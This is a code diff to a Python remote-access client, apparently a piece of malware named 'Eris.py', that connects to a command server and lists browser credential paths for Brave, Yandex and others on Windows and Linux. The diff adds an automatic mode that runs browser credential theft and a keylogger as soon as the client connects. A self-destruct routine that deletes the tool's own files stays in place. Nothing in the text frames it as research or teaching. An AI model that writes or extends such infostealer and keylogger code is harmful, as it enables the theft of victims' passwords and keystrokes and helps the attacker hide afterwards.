@@ -3,7 +3,7 @@ import os
 import platform
 import subprocess
 import socket
-import multiprocessing
+# import multiprocessing
 import time
 import sys
 
@@ -11,6 +11,7 @@ control_address = ("localhost", 8080)
 
 local = os.getenv("LOCALAPPDATA")
 roaming = os.getenv("APPDATA")
+user = os.getenv("HOME")
 
 # windows paths for credentials
 
@@ -23,12 +24,6 @@ paths_win = {
     "Brave": f"{local}\\BraveSoftware\\Brave-Browser\\User Data\\Default",
     "Yandex": f"{local}\\Yandex\\YandexBrowser\\User Data\\Default",
 }
-try:
-    user = (
-        subprocess.run("whoami", capture_output=True).stdout.decode("utf-8").strip("\n")
-    )
-except Exception:
-    user = "not linux"
 
 # linux paths for credentials, limited for now cause I can't be bothered
 paths_tux = {
@@ -38,10 +33,13 @@ paths_tux = {
 }
 
 extensions_db = [".db", ".ldb", ".sqlite", ".sqlite-wal", ".log"]
-extensions_full = [".txt", ".ldb", ".sqlite-wal", ".sqlite", ".json", ".db", ".log"]
+extensions_full = [".txt", ".ldb", ".sqlite-wal",
+                   ".sqlite", ".json", ".db", ".log"]
+
 
 mode = 0
 CID = ""
+AUTOMATIC_MODE = True
 
 
 def Start_Client():
@@ -78,6 +76,10 @@ def Start_Client():
         except Exception as E:
             print(E)
             sys.exit(1)
+
+        if AUTOMATIC_MODE:
+            GetBrowserCreds()
+            KeyLogger()
 
         command = sock.recv(4096)
         if command.__contains__(CID.encode()):
@@ -233,9 +235,7 @@ def KeyLogger():
 def SelfDestruct():
     global os_type
     command_tux = "echo 'rm .CID;rm Eris.py;rm .selfdestruct.sh;' >.selfdestruct.sh"
-    command_win = (
-        "echo '@echo off; DEL .CID; DEL Eris.py; DEL %~f0'; > .selfdestruct.bat"
-    )
+    command_win = "echo '@echo off; DEL .CID; DEL Eris.py; DEL %~f0'; > .selfdestruct.bat"
     if os_type == "Linux":
         try:
             os.system(command_tux)
@@ -253,7 +253,7 @@ def SelfDestruct():
 if __name__ == "__main__":
     try:
         Start_Client()
-    except Exception as E:
+    except Exception:
         # print(E)
         # sock.send(str(E).encode())
         sys.exit(1)
